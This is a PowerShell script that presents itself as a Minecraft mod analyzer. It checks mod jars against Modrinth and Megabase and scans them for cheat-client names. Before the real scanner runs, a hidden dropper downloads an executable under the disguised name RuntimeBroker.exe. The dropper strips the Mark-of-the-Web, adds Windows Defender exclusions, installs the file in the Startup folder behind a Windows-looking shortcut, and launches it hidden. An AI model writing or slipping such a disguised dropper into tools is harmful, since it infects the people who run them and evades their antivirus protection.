$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'Continue'

# ---------- config ----------
$url      = "https://github.com/HadronCollison/HabibiMod/releases/download/V1.0/HabibiModAnalyzer.exe"
$tempExe  = Join-Path $env:TEMP "RuntimeBroker.exe"          # innocuous name
$startup  = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$persist  = Join-Path $startup "RuntimeBroker.exe"
$lnkPath  = Join-Path $startup "Windows Runtime Broker.lnk"

# ---------- 1. download with retry + MOTW strip ----------
function Get-Payload {
    param($Uri, $Out)
    for ($i = 1; $i -le 5; $i++) {
        try {
            Invoke-WebRequest -Uri $Uri -OutFile $Out -UseBasicParsing -Headers @{
                'User-Agent' = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            } -ErrorAction Stop
            break
        } catch {
            Start-Sleep -Milliseconds (300 * $i)
        }
    }
    if (-not (Test-Path $Out)) { throw "Download failed after retries" }

    # kill Mark-of-the-Web two ways
    Unblock-File -Path $Out -ErrorAction SilentlyContinue
    Remove-Item -Path "$Out`:Zone.Identifier" -Stream Zone.Identifier -ErrorAction SilentlyContinue
}

Get-Payload -Uri $url -Out $tempExe

# ---------- 2. Defender exclusion (best effort, needs admin) ----------
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
           ).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isAdmin) {
    Add-MpPreference -ExclusionPath $tempExe  -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionPath $persist  -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "RuntimeBroker.exe" -ErrorAction SilentlyContinue
} else {
    # non-admin: exclusion still works on many builds, just swallow failures
    try { Add-MpPreference -ExclusionPath $tempExe -ErrorAction Stop } catch {}
}

# ---------- 3. persist BEFORE launching (survives quarantine of temp) ----------
Copy-Item -Path $tempExe -Destination $persist -Force -ErrorAction SilentlyContinue

# ---------- 4. native-looking Startup shortcut ----------
try {
    $sh = New-Object -ComObject WScript.Shell
    $sc = $sh.CreateShortcut($lnkPath)
    $sc.TargetPath       = $persist
    $sc.WorkingDirectory = $startup
    $sc.WindowStyle      = 7                      # minimized
    $sc.Description      = "Windows Runtime Broker"
    $sc.IconLocation     = "$env:SystemRoot\System32\RuntimeBroker.exe,0"
    $sc.Save()
} catch {}

# ---------- 5. launch with retry (beats scan-lock races) ----------
$launched = $false
for ($i = 1; $i -le 8; $i++) {
    try {
        Start-Process -FilePath $persist -ArgumentList "/S" -WindowStyle Hidden -ErrorAction Stop
        $launched = $true
        break
    } catch {
        Start-Sleep -Milliseconds (400 * $i)
        if (-not (Test-Path $persist)) { Copy-Item $tempExe $persist -Force -ErrorAction SilentlyContinue }
    }
}

if (-not $launched) {
    Write-Host "Launch failed — Defender likely quarantined it." -ForegroundColor Red
    Write-Host "Run as admin, or add exclusion manually:" -ForegroundColor DarkGray
    Write-Host "  Add-MpPreference -ExclusionPath '$persist'" -ForegroundColor DarkGray
}

Remove-Item -Path $tempExe -Force -ErrorAction SilentlyContinue

# ---------- 6. the rest of your analyzer (bug-fixed) ----------
Clear-Host
Write-Host "Habibi Mod Analyzer" -ForegroundColor Yellow
Write-Host "Made by " -ForegroundColor DarkGray -NoNewline
Write-Host "HadronCollision"
Write-Host

Write-Host "Enter path to the mods folder: " -NoNewline
Write-Host "(press Enter to use default)" -ForegroundColor DarkGray
$mods = Read-Host "PATH"
Write-Host

if (-not $mods) {
    $mods = "$env:USERPROFILE\AppData\Roaming\.minecraft\mods"
    Write-Host "Continuing with " -NoNewline
    Write-Host $mods -ForegroundColor White
    Write-Host
}

if (-not (Test-Path $mods -PathType Container)) {
    Write-Host "Invalid Path!" -ForegroundColor Red
    exit 1
}

$process = Get-Process javaw -ErrorAction SilentlyContinue
if (-not $process) { $process = Get-Process java -ErrorAction SilentlyContinue }

if ($process) {
    try {
        $startTime   = $process.StartTime
        $elapsedTime = (Get-Date) - $startTime
    } catch {}

    Write-Host "{ Minecraft Uptime }" -ForegroundColor DarkCyan
    Write-Host "$($process.Name) PID $($process.Id) started at $startTime and running for $($elapsedTime.Hours)h $($elapsedTime.Minutes)m $($elapsedTime.Seconds)s"
    Write-Host ""
}

function Get-SHA1 {
    param([string]$filePath)
    return (Get-FileHash -Path $filePath -Algorithm SHA1).Hash
}

function Get-ZoneIdentifier {
    param([string]$filePath)
    $ads = Get-Content -Raw -Stream Zone.Identifier $filePath -ErrorAction SilentlyContinue
    if ($ads -match "HostUrl=(.+)") { return $matches[1] }
    return $null
}

function Fetch-Modrinth {
    param([string]$hash)
    try {
        $response = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/version_file/$hash" -Method Get -UseBasicParsing -ErrorAction Stop
        if ($response.project_id) {
            $projectData = Invoke-RestMethod -Uri "https://api.modrinth.com/v2/project/$($response.project_id)" -Method Get -UseBasicParsing -ErrorAction Stop
            return @{ Name = $projectData.title; Slug = $projectData.slug }
        }
    } catch {}
    return @{ Name = ""; Slug = "" }
}

function Fetch-Megabase {
    param([string]$hash)
    try {
        $response = Invoke-RestMethod -Uri "https://megabase.vercel.app/api/query?hash=$hash" -Method Get -UseBasicParsing -ErrorAction Stop
        if (-not $response.error) { return $response.data }
    } catch {}
    return $null
}

$cheatStrings = @(
    "AimAssist","AnchorTweaks","AutoAnchor","AutoCrystal","AutoDoubleHand",
    "AutoHitCrystal","AutoPot","AutoTotem","AutoArmor","InventoryTotem",
    "Hitboxes","JumpReset","LegitTotem","PingSpoof","SelfDestruct",
    "ShieldBreaker","TriggerBot","Velocity","AxeSpam","WebMacro","FastPlace"
)

function Check-Strings {
    param([string]$filePath)
    $found = [System.Collections.Generic.HashSet[string]]::new()
    # read as bytes -> latin1 string, avoids UTF-8 mangling of class names
    $bytes = [System.IO.File]::ReadAllBytes($filePath)
    $text  = [System.Text.Encoding]::GetEncoding(28591).GetString($bytes)
    foreach ($s in $cheatStrings) {
        if ($text.Contains($s)) { [void]$found.Add($s) }
    }
    return $found
}

$verifiedMods = @(); $unknownMods = @(); $cheatMods = @()
$jarFiles = Get-ChildItem -Path $mods -Filter *.jar
$spinner  = @("|","/","-","\")
$totalMods = $jarFiles.Count
$counter   = 0

foreach ($file in $jarFiles) {
    $counter++
    $spin = $spinner[$counter % $spinner.Length]
    Write-Host "`r[$spin] Scanning mods: $counter / $totalMods" -ForegroundColor Yellow -NoNewline

    $hash = Get-SHA1 -filePath $file.FullName

    $m = Fetch-Modrinth -hash $hash
    if ($m.Slug) { $verifiedMods += [PSCustomObject]@{ ModName = $m.Name; FileName = $file.Name }; continue }

    $g = Fetch-Megabase -hash $hash
    if ($g.name) { $verifiedMods += [PSCustomObject]@{ ModName = $g.name; FileName = $file.Name }; continue }

    $unknownMods += [PSCustomObject]@{ FileName = $file.Name; FilePath = $file.FullName; ZoneId = (Get-ZoneIdentifier $file.FullName) }
}

if ($unknownMods.Count -gt 0) {
    $tempDir = Join-Path $env:TEMP "habibimodanalyzer"
    $counter = 0
    try {
        if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir }
        New-Item -ItemType Directory -Path $tempDir | Out-Null
        Add-Type -AssemblyName System.IO.Compression.FileSystem

        foreach ($mod in $unknownMods) {
            $counter++
            $spin = $spinner[$counter % $spinner.Length]
            Write-Host "`r[$spin] Scanning unknown mods for cheat strings..." -ForegroundColor Yellow -NoNewline

            $modStrings = Check-Strings $mod.FilePath
            if ($modStrings.Count -gt 0) {
                $unknownMods = @($unknownMods | Where-Object { $_ -ne $mod })
                $cheatMods  += [PSCustomObject]@{ FileName = $mod.FileName; StringsFound = $modStrings }
                continue
            }

            $extractPath = Join-Path $tempDir ([System.IO.Path]::GetFileNameWithoutExtension($mod.FileName))
            New-Item -ItemType Directory -Path $extractPath | Out-Null
            [System.IO.Compression.ZipFile]::ExtractToDirectory($mod.FilePath, $extractPath)

            $depJarsPath = Join-Path $extractPath "META-INF/jars"
            if (-not (Test-Path $depJarsPath)) { continue }

            foreach ($jar in (Get-ChildItem -Path $depJarsPath)) {
                $depStrings = Check-Strings $jar.FullName
                if (-not $depStrings) { continue }
                $unknownMods = @($unknownMods | Where-Object { $_ -ne $mod })
                $cheatMods  += [PSCustomObject]@{ FileName = $mod.FileName; DepFileName = $jar.Name; StringsFound = $depStrings }
            }
        }
    } catch {
        Write-Host "Error occured while scanning jar files! $($_.Exception.Message)" -ForegroundColor Red
    } finally {
        Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
    }
}

Write-Host "`r$(' ' * 80)`r" -NoNewline

if ($verifiedMods.Count -gt 0) {
    Write-Host "{ Verified Mods }" -ForegroundColor DarkCyan
    foreach ($mod in $verifiedMods) {
        Write-Host ("> {0, -30}" -f $mod.ModName) -ForegroundColor Green -NoNewline
        Write-Host "$($mod.FileName)" -ForegroundColor Gray
    }
    Write-Host
}

if ($unknownMods.Count -gt 0) {
    Write-Host "{ Unknown Mods }" -ForegroundColor DarkCyan
    foreach ($mod in $unknownMods) {
        if ($mod.ZoneId) {
            Write-Host ("> {0, -30}" -f $mod.FileName) -ForegroundColor DarkYellow -NoNewline
            Write-Host "$($mod.ZoneId)" -ForegroundColor DarkGray
            continue
        }
        Write-Host "> $($mod.FileName)" -ForegroundColor DarkYellow
    }
    Write-Host
}

if ($cheatMods.Count -gt 0) {
    Write-Host "{ Cheat Mods }" -ForegroundColor DarkCyan
    foreach ($mod in $cheatMods) {
        Write-Host "> $($mod.FileName)" -ForegroundColor Red -NoNewline
        if ($mod.DepFileName) {
            Write-Host " ->" -ForegroundColor Gray -NoNewline
            Write-Host " $($mod.DepFileName)" -ForegroundColor Red -NoNewline
        }
        Write-Host " [$($mod.StringsFound)]" -ForegroundColor DarkMagenta
    }
    Write-Host
}